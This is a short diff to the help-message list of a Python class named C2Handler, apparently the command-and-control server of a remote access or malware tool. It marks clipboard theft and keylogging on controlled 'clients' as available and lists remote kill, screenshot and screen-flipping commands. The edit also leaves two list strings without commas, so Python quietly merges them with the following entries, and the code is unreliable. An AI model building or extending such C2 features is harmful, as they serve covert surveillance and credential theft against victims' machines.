@@ -166,12 +166,9 @@ class C2Handler(BaseHTTPRequestHandler):
                               "client unzip FILENAME - unzip and decrypt a file on the client",
                               "client kill - permanently shutdown the active client",
                               "client delay SECONDS - change the delay setting for a client's reconnection attempts"
-                              " (coming soon)",
-                              "client sleep SECONDS - put the client to sleep for a while (may remove soon)",
-                              "client get clipboard - grab a copy of the client's clipboard (coming soon)",
-                              "client keylog on - start up a keylogger on the client (coming soon)",
+                              "client get clipboard - grab a copy of the client's clipboard",
+                              "client keylog on - start up a keylogger on the client",
                               "client keylog off - turn off the keylogger on the client and write the results to disk"
-                              " (coming soon)",
                               "client screenshot - grab a copy of the client's screens (coming soon)",
                               "client display FILENAME - display an image on the client's screen (coming soon)",
                               "client flip screen - flip a client's screen upside down (coming soon)",
